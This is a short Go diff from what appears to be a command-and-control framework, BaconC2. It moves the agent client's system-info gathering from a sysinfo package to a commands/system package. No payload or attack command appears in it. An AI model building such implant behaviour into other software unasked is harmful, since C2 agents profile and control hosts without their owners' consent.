@@ -4,8 +4,8 @@ import (
 	"log"
 
 	"github.com/RabbITCybErSeC/BaconC2/client/config"
-	"github.com/RabbITCybErSeC/BaconC2/client/core/sysinfo"
 	"github.com/RabbITCybErSeC/BaconC2/client/core/transport"
+	"github.com/RabbITCybErSeC/BaconC2/pkg/commands/system"
 	"github.com/RabbITCybErSeC/BaconC2/pkg/models"
 	"github.com/RabbITCybErSeC/BaconC2/pkg/queue"
 )
@@ -29,7 +29,7 @@ func NewAgentClient(cfg *config.AgentConfig, tr transport.ITransportProtocol, co
 }
 
 func (c *AgentClient) Initialize() error {
-	sysInfo, err := sysinfo.GatherMinimalInfo(c.config.Protocol)
+	sysInfo, err := system.GatherMinimalInfo(c.config.Protocol)
 	if err != nil {
 		log.Printf("Failed to gather minimal system info: %v", err)
 	}
